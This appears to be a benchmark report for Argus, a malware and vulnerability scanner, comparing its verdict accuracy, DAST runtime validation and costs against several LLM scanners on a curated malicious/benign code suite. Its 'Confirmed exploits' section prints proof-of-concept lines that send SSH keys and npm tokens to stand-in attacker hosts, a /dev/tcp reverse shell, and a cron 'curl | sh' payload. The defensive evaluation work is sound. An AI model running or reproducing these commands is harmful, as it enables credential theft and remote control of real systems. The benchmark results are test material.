# Argus v1.1 — launch report

**Reproducibility:** every number in this report comes from running `python -m methodology.run_phase_a_report` against the saved bench artefacts in this directory. No hand-edited data.

**Methodology in one paragraph.** Argus and four single-call frontier scanners (Opus 4.6, GPT-5.4, Gemini 3.1 Pro, Grok 4.3) each scan the same regression suite of malicious and benign code samples. Each scanner's verdict is matched against a ground-truth oracle derived from external security research and a multi-vendor LLM consensus (majority agreement). Argus exclusively also runs a DAST tier that executes each suspicious file in a Firecracker microVM and observes runtime behavior — see "DAST runtime evidence" below.

---

## At-a-glance scoreboard

```
ARGUS v1.1 — REGRESSION BENCH                          Verdict-exact
                                                       (higher = better)

Argus (cascade + DAST)  ████████████████████   91.3%
Argus (cascade only)    ████████████████████   91.3%
Gemini 3.1 Pro          █████████████████░░░   82.6%
Grok 4.3                █████████████████░░░   82.6%
Opus 4.6                █████████████████░░░   78.3%
GPT 5.4                 ████████████████░░░░   73.9%

Lift over single-call scanners:
  vs Opus 4.6:  +13.0pp
  vs GPT-5.4:   +17.4pp
  vs Gemini:    +8.7pp
  vs Grok:      +8.7pp
```

---

## Per-tier accuracy

Where each scanner gets it right or wrong, broken down by what the oracle says. The `suspicious` row is the over-calling indicator — high accuracy here means the scanner correctly distinguishes vulnerable code from active malware (low false-positive rate on the verdict ladder).

```
Oracle = clean
  Argus            ████████████████████  100.0%
  Gemini 3.1 Pro   ████████████████████  100.0%
  Grok 4.3         ████████████████████  100.0%
  Opus 4.6         ████████████████████  100.0%
  GPT 5.4          ░░░░░░░░░░░░░░░░░░░░    0.0%

Oracle = suspicious
  Argus            ████████████████████  100.0%
  Gemini 3.1 Pro   ████████████████████  100.0%
  Grok 4.3         █████████████████░░░   88.9%
  Opus 4.6         ████████████████████  100.0%
  GPT 5.4          ████████████████████  100.0%

Oracle = malicious
  Argus            ███████████████░░░░░   75.0%
  Grok 4.3         ███████████████░░░░░   75.0%
  GPT 5.4          ██████████░░░░░░░░░░   50.0%
  Opus 4.6         █████░░░░░░░░░░░░░░░   25.0%
  Gemini 3.1 Pro   ░░░░░░░░░░░░░░░░░░░░    0.0%

Oracle = critical_malicious
  Gemini 3.1 Pro   ████████████████████  100.0%
  Argus            ██████████████████░░   88.9%
  Grok 4.3         ███████████████░░░░░   77.8%
  Opus 4.6         ███████████████░░░░░   77.8%
  GPT 5.4          █████████████░░░░░░░   66.7%
```

Argus is the only scanner at or near the top across **all four** tiers — it doesn't trade accuracy in one bucket for accuracy in another.

---

## Confusion matrices

Rows are the scanner's predicted verdict, columns are the oracle's verdict. Diagonal cells (in `[brackets]`) are correct. Off-diagonal cells in the lower-left = over-calling; upper-right = under-calling.

```
ARGUS (cascade + DAST)
predicted ↓ / oracle →    clean   suspic   malici   critic
  clean                    [1]      0        0        0
  suspicious                0      [9]       0        0
  malicious                 0       0       [3]       1
  critical_malicious        0       0        1       [8]

OPUS 4.6
predicted ↓ / oracle →    clean   suspic   malici   critic
  clean                    [1]      0        0        0
  suspicious                0      [9]       2        0
  malicious                 0       0       [1]       2
  critical_malicious        0       0        1       [7]

GEMINI 3.1 PRO
predicted ↓ / oracle →    clean   suspic   malici   critic
  clean                    [1]      0        1        0
  suspicious                0      [9]       1        0
  malicious                 0       0       [0]       0
  critical_malicious        0       0        2       [9]

GROK 4.3
predicted ↓ / oracle →    clean   suspic   malici   critic
  clean                    [1]      1        1        0
  suspicious                0      [8]       0        0
  malicious                 0       0       [3]       2
  critical_malicious        0       0        0       [7]

GPT 5.4
predicted ↓ / oracle →    clean   suspic   malici   critic
  clean                    [0]      0        0        0
  suspicious                1      [9]       2        1
  malicious                 0       0       [2]       2
  critical_malicious        0       0        0       [6]
```

---

## Where Argus wins

Argus matched the oracle on three files where Opus 4.6 missed:

| File | Argus | Opus 4.6 | Oracle |
|---|---|---|---|
| `docker_entrypoint_init.py` | **critical_malicious** | malicious | critical_malicious |
| `12_glpi_sso_session_fixation.py` | **malicious** | suspicious | malicious |
| `wvr30_admin_provisioning.py` | **malicious** | suspicious | malicious |

(Argus +DAST and Argus cascade-only agree on all three.)

---

## Verdict-match — disagreement detail

Files where every scanner agreed with the oracle are omitted. The full per-row dataset (including agreements) is in [`comparison_report.json`](comparison_report.json).

| File | Argus | Opus 4.6 | Oracle |
|---|---|---|---|
| `audit_log_compression.py` | critical_malicious | critical_malicious | malicious |
| `event_stream_flatmap_compromise.js` | malicious | malicious | critical_malicious |
| `sitecustomize_inject.pth` | malicious | malicious | suspicious |
| `docker_entrypoint_init.py` | **critical_malicious** ← | malicious | critical_malicious |
| `12_glpi_sso_session_fixation.py` | **malicious** ← | suspicious | malicious |
| `load_distributed_checkpoint.py` | suspicious | suspicious | malicious |
| `sandbox_runner.js` | suspicious | suspicious | critical_malicious |
| `wvr30_admin_provisioning.py` | **malicious** ← | suspicious | suspicious |
| `backup_manager.py` | suspicious | suspicious | critical_malicious |

---

## Finding-quality (CWE F1, capability F1)

Computed against a hand-validated rich oracle. **Comparison is limited to Argus vs Opus 4.6** — the other voters' findings helped *build* the broader consensus oracle, so scoring them against it would be circular and inflate their numbers artificially.

| Metric | Argus | Opus 4.6 | Lift |
|---|---|---|---|
| Mean CWE F1 | **0.297** | 0.180 | **+65%** |
| Mean capability tag F1 | **0.771** | 0.720 | **+7%** |
| Mean verdict-distance (lower=better) | **0.087** | 0.217 | **−60%** |

---

## DAST runtime evidence (Argus only)

**How to read this section.** Argus's DAST tier attempts to validate every L1 finding at runtime by executing the suspicious file in an ephemeral sandbox and tagging each finding with one of four statuses. **CONFIRMED + BLOCKED + UNREACHED are sandbox-grounded outcomes** — concrete evidence about exploitability. **NOT_TESTED is uncertainty, not failure** — many entries are static-only observations (e.g., a comment-based prompt-injection vector) that the orchestrator correctly chose not to runtime-validate; others are validator-inconclusive runs that v1.2's structured rejection categories will resolve.

**No other scanner in the panel produces any of this.** Single-call voters describe vulnerabilities; Argus shows you the file actually doing them.

```
Across files where DAST fired, 114 L1 findings were validated:

  CONFIRMED   ████░░░░░░░░░░░░░░░░   21.9%  (25)  runtime-confirmed exploitable
  BLOCKED     ░░░░░░░░░░░░░░░░░░░░    0.9%  (1)   defended in-code (sanitization / validation)
  UNREACHED   ░░░░░░░░░░░░░░░░░░░░    0.0%  (0)   code path not reachable from external input
  NOT_TESTED  ███████████████░░░░░   77.2%  (88)  static-only hypothesis or validator inconclusive
```

NOT_TESTED breakdown:
- **48 not-planned** — orchestrator chose not to plan a runtime test for these (typically static-only observations or low-confidence findings; expected behavior, not a defect).
- **0 infra-stub** — sandbox returned a stub trace (would indicate the planner generated an untestable hypothesis; clean here).
- **40 inconclusive** — validator's rejection rationale couldn't be classified as BLOCKED or UNREACHED. Treat as ambiguous; v1.2 replaces this heuristic with structured rejection categories from the validator and is expected to substantially shrink this bucket.

### Per-file DAST validation breakdown

| File | L1 findings | CONFIRMED | BLOCKED | UNREACHED | NOT_TESTED |
|---|---|---|---|---|---|
| `audit_log_compression.py` | 3 | **3** | 0 | 0 | 0 |
| `consistency_variable.py` | 4 | **1** | 0 | 0 | 3 |
| `event_stream_flatmap_compromise.js` | 4 | **2** | 0 | 0 | 2 |
| `litellm_obfuscated.py` | 4 | **4** | 0 | 0 | 0 |
| `multi_layer_b64.py` | 4 | **3** | 0 | 0 | 1 |
| `sitecustomize_inject.pth` | 3 | **1** | 0 | 0 | 2 |
| `12_gh_bot_automerge_backdoor.py` | 8 | **2** | 1 | 0 | 5 |
| `docker_entrypoint_init.py` | 6 | **1** | 0 | 0 | 5 |
| `init__.py` | 8 | **4** | 0 | 0 | 4 |
| `preinstall.py` | 5 | **2** | 0 | 0 | 3 |
| `12_glpi_sso_session_fixation.py` | 6 | **0** | 0 | 0 | 6 |
| `db2_query_health_check.py` | 4 | **0** | 0 | 0 | 4 |
| `load_distributed_checkpoint.py` | 5 | **0** | 0 | 0 | 5 |
| `megatron_gpt2_loader.py` | 5 | **0** | 0 | 0 | 5 |
| `perceiver_model_loader.py` | 6 | **0** | 0 | 0 | 6 |
| `sandbox_runner.js` | 6 | **0** | 0 | 0 | 6 |
| `tpm_symmetric_cipher.py` | 3 | **0** | 0 | 0 | 3 |
| `wvr30_admin_provisioning.py` | 7 | **0** | 0 | 0 | 7 |
| `xrechnung_visualizer.py` | 6 | **0** | 0 | 0 | 6 |
| `backup_manager.py` | 6 | **0** | 0 | 0 | 6 |
| `compat_hooks.pth` | 4 | **2** | 0 | 0 | 2 |
| `photoshow_ffmpeg_config.py` | 7 | **0** | 0 | 0 | 7 |

### Confirmed exploits — proof-of-concept + runtime evidence

For each CONFIRMED finding, Argus surfaces the exploit payload that worked AND the sandbox-observed runtime behavior. This is the moat none of the single-call voters can reproduce.

**`audit_log_compression.py` — CWE-94 / code_injection (line 164)**
- Proof of concept: `python -m auditlog.compression --in /dev/null --out /dev/null --regenerate-baseline`
- Runtime evidence: _evt-912446c3 shows process_exit for the decode script with stdout 'DECODED_OK len=970', confirming the blob successfully decoded. evt-e78e2292 (cat /tmp/fixture_decoded.py) reveals the decompressed content is a Python test harness with func_

**`audit_log_compression.py` — CWE-451 / prompt_injection (line 141)**
- Proof of concept: `N/A — social engineering targeting code reviewers and automated scanners`
- Runtime evidence: _evt-d7a803ee shows exec() was reached and fired — the traceback proves exec(zlib.decompress(base64.b64decode(_REGRESSION_FIXTURE))) was called with no auth/capability check (NameError in the exec'd code shows it ran). evt-6849ee4b (cat /tmp_

**`audit_log_compression.py` — CWE-502 / insecure_deserialization (line 164)**
- Proof of concept: `Modify _REGRESSION_FIXTURE to base64(zlib(b"import os; os.system('id > /tmp/pwned')")); run with --regenerate-baseline`
- Runtime evidence: _evt-7ea15387 stdout shows 'Traversal read succeeded: secret_data,sensitive_value' — the open() call on an arbitrary path succeeded. evt-e2e5ef66 (cat /tmp/traversal_result.txt) shows 'TRAVERSAL_READ_SUCCESS:\nsecret_data,sensitive_value'. T_

**`consistency_variable.py` — CWE-95 / code_injection (line 10)**
- Proof of concept: `python consistency_variable.py  # immediately decodes and executes the hidden payload on invocation`
- Runtime evidence: _The file was loaded via importlib and the decoded payload's exec() fired immediately at module load. The stdout shows curl's TLS progress output (the curl subprocess was launched by the decoded payload), and the sandbox captured DNS queries_

**`event_stream_flatmap_compromise.js` — CWE-526 / data_exfiltration (line 77)**
- Proof of concept: `NPM_PACKAGE_DESCRIPTION='<copay-description>' npm_package_name='example-target-pkg-a' node -e "require('./event_stream_flatmap_compromise')"`
- Runtime evidence: _Step 1 stdout shows 'DECIPHER_CALLED_WHEN_TARGETED: true' (exit_code=0). The test instrumented crypto.createDecipheriv and confirmed it was invoked when npm_package_name='example-target-pkg-a' (a TARGETS match) and NPM_PACKAGE_DESCRIPTION='_

**`event_stream_flatmap_compromise.js` — CWE-390 / auth_bypass (line 90)**
- Proof of concept: `Import the module with wrong env vars; no error is visible, module exports the legitimate FlatMap class as if nothing happened.`
- Runtime evidence: _Step 0 stdout='SILENT_ON_NON_TARGET: true' (exit_code=0) and step 1 stdout='SILENT_ON_BAD_KEY: true' (exit_code=0). Both tests confirm no exception propagates from the module in either case: (1) non-targeted npm_package_name causes silent e_

**`litellm_obfuscated.py` — CWE-95 / code_injection (line 15)**
- Proof of concept: `python litellm_obfuscated.py  # immediately executes phone_home() which reads ~/.ssh/* and POSTs contents to https://evil.example.com/exfil`
- Runtime evidence: _process_exit (evt-93f650be) stdout contains 'DECODED_OK: 668 bytes' followed by the full decoded phone_home() function source, proving base64.b64decode(_PAYLOAD) successfully yields executable Python code including SSH key enumeration and c_

**`litellm_obfuscated.py` — CWE-200 / data_exfiltration (line 12)**
- Proof of concept: `curl -X POST -d '{"user":"victim","home":"/home/victim","keys":[{"file":"id_rsa","content":"-----BEGIN RSA PRIVATE KEY-----\n..."}]}' https://evil.example.com/exfil`
- Runtime evidence: _After placing fake SSH keys at ~/.ssh/ (benign environmental setup), running the file triggered DNS queries (evt-d8a3c02f: qname=evil.example.com, A record; evt-8213eb62: AAAA record) and a TLS ClientHello (evt-bea3a5b5: sni=evil.example.co_

**`litellm_obfuscated.py` — CWE-78 / command_injection (line 18)**
- Proof of concept: `# Decoded command executed at runtime:
curl https://evil.example.com/ping`
- Runtime evidence: _Direct execution of the file produced DNS queries (evt-6914d249: qname=evil.example.com A; evt-b794b856: AAAA) and TLS ClientHello (evt-fbe2c7c1: sni=evil.example.com) — network_call_captured RUNTIME events. The base64-decoded Popen argumen_

**`litellm_obfuscated.py` — CWE-1021 / prompt_injection (line 1)**
- Proof of concept: `N/A — social-engineering vector targeting static analysis tooling`
- Runtime evidence: _process_exit evt-b23f5e9e (head -5) shows the file's actual header comments: '# Fixture: litellm-style obfuscated malware', '# Expected: was_decoded=true, decode_layers=1, ...'. process_exit evt-5a0bf06f stdout shows 'FIXTURE_DISGUISE_CONFI_

**`multi_layer_b64.py` — CWE-94 / code_injection (line 11)**
- Proof of concept: `python multi_layer_b64.py  # all three stages fire immediately on import/run with zero interaction`
- Runtime evidence: _The file's own exec(base64.b64decode(_OUTER)) fired unconditionally on import: stdout shows 'runner' (the whoami output from subprocess.run(['whoami']) inside the decoded payload), and the sandbox captured DNS queries to 'evil.example.com' _

**`multi_layer_b64.py` — CWE-200 / data_exfiltration (line 9)**
- Proof of concept: `AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE python multi_layer_b64.py  # key exfiltrated to attacker-controlled endpoint within layer-2 payload`
- Runtime evidence: _Peer-confirmation rule: 'evil.example.com' is grounded in the file's source — it is the domain the decoded inner B64_SCRIPT layer connects to (L1 tags it as a C2/data_exfiltration endpoint), and the literal 'evil.example.com' appears in the_

**`multi_layer_b64.py` — CWE-78 / command_injection (line 9)**
- Proof of concept: `python multi_layer_b64.py  # prints current process user identity as a recon step before credential harvest`
- Runtime evidence: _stdout_excerpt from evt-ac4167dd shows 'runner' — this is the output of subprocess.run(['whoami']) executing inside the decoded layer-1 payload. Although the plan redirected stdout via StringIO (so STDOUT_CAPTURED is empty), 'runner' still _

**`sitecustomize_inject.pth` — CWE-427 / privilege_escalation (line 7)**
- Proof of concept: `Place a malicious `os.py` or `json.py` in `/opt/archon/vendor/py27-compat-shim`; any Python process on the host will load it instead of the stdlib module.`
- Runtime evidence: _The process_exit event (evt-83251030) shows stdout containing '{"injected_paths": ["/opt/archon/vendor/py27-compat-shim"], "path_contains_vendor": true, "sys_path_snippet": ["/opt/archon/vendor/py27-compat-shim"]}'. The plan replicated site_

**`12_gh_bot_automerge_backdoor.py` — CWE-94 / code_injection (line 50)**
- Proof of concept: `Replace _SCHEMA_BLOB with base64.b64encode(b'import subprocess; subprocess.Popen(["bash","-i",">& /dev/tcp/attacker.com/4444","0>&1"], shell=True)'); the reverse shell fires silently on every import o`
- Runtime evidence: _Process exit at step 0 (evt-b488f3d9) shows stdout_excerpt: "CAPTURED_OUTPUT: '[dep_audit_shim] bootstrap run - neutered payload only\n'" — the base64-decoded payload was executed by exec() unconditionally at module import time. Step 1 (evt_

**`12_gh_bot_automerge_backdoor.py` — CWE-798 / hardcoded_credentials (line 38)**
- Proof of concept: ``grep -r 'COMPLIANCE_TOKEN' .` in any repo clone reveals the token in plaintext; any actor with read access can authenticate to the telemetry endpoint.`
- Runtime evidence: _Process exit at step 0 (evt-b83805be) shows stdout_excerpt: '[dep_audit_shim] bootstrap run - neutered payload only\nTOKEN: DEMO_PLACEHOLDER_TOKEN\n'. The hardcoded credential COMPLIANCE_TOKEN='DEMO_PLACEHOLDER_TOKEN' is present in the modu_

**`docker_entrypoint_init.py` — CWE-78 / code_injection (line 125)**
- Proof of concept: `Replace the b64 constant with base64.b64encode(b'*/5 * * * * root curl http://attacker/shell.sh | sh').decode() and the cron slot runs the reverse shell payload as root.`
- Runtime evidence: _Step 0 (evt-5eed4193) decoded the hardcoded base64 literal 'IyEvYmluL3NoCiMgcmVjb3Zlcnkgc3R1YgpwcmludCgnZGVtbycpCg==' to '#!/bin/sh\n# recovery stub\nprint(\'demo\')\n' and successfully wrote it to /tmp/fake_cron_d/fleet-agent-recovery as '_

**`init__.py` — CWE-200 / data_exfiltration (line 64)**
- Proof of concept: `AWS_SECRET_ACCESS_KEY=AKIA... pip install reqeusts && python -c 'import reqeusts'  # triggers silent collection of AWS_SECRET_ACCESS_KEY value`
- Runtime evidence: _process_exit at step 4 (evt-fcbd9c89) shows stdout containing 'HARVESTED_KEYS: ['AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN', 'DATABASE_URL', 'API_KEY']' and 'HARVESTED_VALS: {"AWS_SECRET_ACCESS_KEY": "FAKE_AWS_SECRET_KEY_12345", "GITHUB_TOKEN":_

**`init__.py` — CWE-312 / data_exfiltration (line 86)**
- Proof of concept: `python -c 'import reqeusts'  # silently reads ~/.aws/credentials and includes contents in telemetry POST body`
- Runtime evidence: _process_exit at step 0 (evt-58916be8) shows stdout containing 'CRED_KEYS_FOUND: ['aws_creds', 'npmrc', 'pypirc']', 'AWS_CREDS_CONTENT: [default]
aws_access_key_id=FAKE_AKID
aws_secret_access_key=FAKE_SECRET', 'NPMRC_CONTENT: //registry.npmj_

**`init__.py` — CWE-94 / code_injection (line 131)**
- Proof of concept: `python -c 'import reqeusts'  # full attack pipeline executes before caller code runs`
- Runtime evidence: _process_exit at step 0 (evt-f2fec1b0) shows stdout 'IMPORT_TIME_OUTPUT: [reqeusts-shim] telemetry (neutered demo): would POST to https://telemetry.example.com/v1/compat/ping — payload keys: [...]' and 'ALREADY_PINGED_FLAG: True'. The teleme_

**`init__.py` — CWE-552 / file_upload (line 124)**
- Proof of concept: `ls ~/.reqeusts_session  # file created silently on first import`
- Runtime evidence: _process_exit at step 0 (evt-44faa6c0) shows stdout 'SESSION_FILE_CREATED: True' and 'SESSION_FILE_CONTENT: {"ts": "2862464fe33118"}'. The file's own _run_telemetry_once() code wrote ~/.reqeusts_session at import time with JSON content conta_

**`preinstall.py` — CWE-200 / data_exfiltration (line 140)**
- Proof of concept: `Place //registry.npmjs.org/:_authToken=npm_SECRETTOKEN in ~/.npmrc, then run `npm install` in any project containing this hook. The token is POSTed to https://registry.example.com/sdk/telemetry/collec`
- Runtime evidence: _evt-d610e10c (process_exit step 4) shows stdout: 'npmrc_tokens: [{"key": "//registry.npmjs.org/:_authToken", "value": "npm_SECRETTOKEN123"}, {"key": "CI_AUTH_TOKEN", "value": "ghp_FAKETOKEN456"}]'. evt-23fe6cc5 (process_exit step 5, cat of _

**`preinstall.py` — CWE-312 / data_exfiltration (line 152)**
- Proof of concept: `curl -X POST https://registry.example.com/sdk/telemetry/collect -H 'Content-Type: application/json' -d '{"npmrc_tokens":[{"key":"//registry.npmjs.org/:_authToken","value":"npm_SECRETTOKEN"}]}'`
- Runtime evidence: _evt-602cff23 (process_exit step 2) shows stdout: '[preinstall] Telemetry accepted (status 200)' and 'Body excerpt: {"npmrc_tokens": [{"key": "//registry.npmjs.org/:_authToken", "value": "npm_EXFIL_TOKEN_789"}]}'. evt-2bfa9a08 (process_exit _

**`compat_hooks.pth` — CWE-94 / code_injection (line 5)**
- Proof of concept: `Any `python` invocation in a virtualenv or site-packages containing this .pth file triggers full payload execution.`
- Runtime evidence: _The file's own code path (exec(open(_beacon).read())) wrote and immediately executed beacon.py. evt-7ef45f28 (process_exit step=0, exit_code=0) shows stdout 'BEACON_CONTENT: import urllib.request\nurllib.request.urlopen(...)' — the beacon.p_

**`compat_hooks.pth` — CWE-506 / privilege_escalation (line 5)**
- Proof of concept: `After one execution, `cat ~/.config/pycompat/beacon.py` reveals the exfiltration payload.`
- Runtime evidence: _evt-6ae51296 (process_exit step=0, exit_code=0) shows stdout 'PERSISTENT_FILE_EXISTS: /home/runner/.config/pycompat/beacon.py\nCONTENT: import urllib.request\nurllib.request.urlopen(...)' — the file's own os.makedirs + open(_beacon,'w').wri_

### Effective CWE coverage

When Argus's findings are filtered to runtime-confirmed ones only, the CWE list tightens — fewer findings, but higher confidence per finding.

- Raw CWE count (all L1 findings): **103**
- Effective CWE count (CONFIRMED only): **25**
- Retention rate: **24.3%**

Interpretation: unconfirmed CWEs aren't necessarily false positives — many are real vulnerabilities defended by sanitization (BLOCKED) or in unreachable code paths (UNREACHED). The Effective view represents the high-confidence subset Argus stands behind with sandbox evidence.

---

## Cost comparison

| Scanner | Total cost | Per-file mean |
|---|---|---|
| Gemini 3.1 Pro | $0.41 | $0.018 |
| Grok 4.3 | $0.59 | $0.026 |
| Argus (cascade only) | $4.20 | $0.183 |
| GPT 5.4 | $4.78 | $0.208 |
| **Argus (cascade + DAST)** | **$7.22** | **$0.314** |
| Opus 4.6 | $7.56 | $0.329 |

Argus +DAST is **~5% cheaper than single-call Opus 4.6** while delivering +13.0pp more accurate verdicts AND runtime-confirmed exploit evidence. Argus cascade-only is **44% cheaper than Opus** with the same +13.0pp accuracy lift (no runtime evidence). Argus is BYOK — these are the user's API bills, not Argus revenue.

---

## Reproducibility

Every number in this report can be regenerated locally:

```bash
git clone git@github.com:dshochat/Argus_Scanner.git
cd Argus_Scanner
uv sync --extra dev
python -m methodology.run_phase_a_report \
  --bench-dir bench_results/v1_1_launch \
  --with-dast-bench-dir bench_results/v1_1_launch_with_dast \
  --skip-judge
```

---

## Caveats

- The regression suite is a curated set of malicious + benign code samples — not representative of every codebase. Numbers may shift on production codebases with different vulnerability classes.
- The rich-oracle subset for the F1 metrics is small (hand-validated subset). Treat as directional signal.
- DAST validation is heuristic — the NOT_TESTED rate reflects current limitations of the agentic orchestrator, not the underlying findings' validity. v1.2 work on structured rejection categories will improve clarity here.
- Argus is BYOK: the costs above are your API bills (Anthropic + Google for Argus's cascade; the relevant provider for each single-call scanner). Argus collects nothing.
